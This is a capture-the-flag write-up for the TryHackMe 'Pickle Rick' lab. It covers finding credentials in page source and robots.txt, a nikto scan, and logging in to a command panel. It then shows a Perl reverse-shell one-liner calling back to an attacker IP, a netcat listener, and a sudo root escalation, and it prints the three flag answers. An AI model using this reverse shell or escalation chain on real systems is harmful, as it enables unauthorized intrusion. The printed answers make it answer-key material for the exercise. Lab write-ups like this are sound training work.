# Pickle Rick

## Task 1

```
export IP=10.10.90.223
```

### 1 What is the first ingredient Rick needs?

**/robots.txt:**
```
Wubbalubbadubdub
```


**/index.html source:**
```html
<!--

  Note to self, remember username!

  Username: R1ckRul3s

-->
```

Running nikto found a login page at `/login.php`:
```bash
jeffrowell@kali:~/Documents/TryHackMe/Pickle Rick$ nikto -url http://$IP
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.90.223
+ Target Hostname:    10.10.90.223
+ Target Port:        80
+ Start Time:         2020-05-23 14:36:09 (GMT-6)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
^[[A+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Server may leak inodes via ETags, header found with file /, inode: 426, size: 5818ccf125686, mtime: gzip
+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Allowed HTTP Methods: OPTIONS, GET, HEAD, POST
+ Cookie PHPSESSID created without the httponly flag
+ OSVDB-3233: /icons/README: Apache default file found.
+ /login.php: Admin login page/section found.
+ 7889 requests: 0 error(s) and 9 item(s) reported on remote host
+ End Time:           2020-05-23 14:56:45 (GMT-6) (1236 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

Now we can log in with the credentials `R1ckRul3s:Wubbalubbadubdub`


We are prompted with a command panel where we can run some bash commands, so we start just runniing `ls` to see what files are in the directory:

![ls](https://user-images.githubusercontent.com/32188816/82740578-51260700-9d07-11ea-8619-9236da660562.png)

Lets try to view the file `Sup3rS3cretPickl3Ingred.txt`. As it turns out, we cannot run `cat` or `more`:

![denied_cat](https://user-images.githubusercontent.com/32188816/82740585-6dc23f00-9d07-11ea-82cb-e1bb74686919.png)

But we can run `less`:

![less](https://user-images.githubusercontent.com/32188816/82740734-d100a100-9d08-11ea-8406-c64fa1372518.png)

```
mr. meeseek hair
```

### 2 What is the second ingredient Rick needs?

We are able to get a perl reverse shell with the payload from pentestmonkey:
```bash
perl -e 'use Socket;$i="10.8.21.42";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

```bash
jeffrowell@kali:~/Documents/TryHackMe/Pickle Rick/assets$ nc -lvp 1234
listening on [any] 1234 ...
10.10.90.223: inverse host lookup failed: Unknown host
connect to [10.8.21.42] from (UNKNOWN) [10.10.90.223] 54614
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Before getting linpeas on the box and enumerating just checking some low hanging fruit shows that we can run any command as root with no password!

```bash
www-data@ip-10-10-90-223:/tmp$ sudo -l
sudo -l
Matching Defaults entries for www-data on
    ip-10-10-90-223.eu-west-1.compute.internal:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on
        ip-10-10-90-223.eu-west-1.compute.internal:
    (ALL) NOPASSWD: ALL
www-data@ip-10-10-90-223:/tmp$ sudo su
sudo su
root@ip-10-10-90-223:/tmp# id
id
uid=0(root) gid=0(root) groups=0(root)
```

```bash
root@ip-10-10-90-223:/var/www/html# ls /home
ls /home
rick  ubuntu
```

```bash
root@ip-10-10-90-223:/var/www/html# cd /home/rick
root@ip-10-10-90-223:/home/rick# ls
ls
second ingredients
root@ip-10-10-90-223:/home/rick# cat "second ingredients"
cat "second ingredients"
1 jerry tear
```

### 3 What is the third ingredient Rick needs?
```bash
root@ip-10-10-90-223:~# cat 3rd.txt
cat 3rd.txt
3rd ingredients: fleeb juice
```
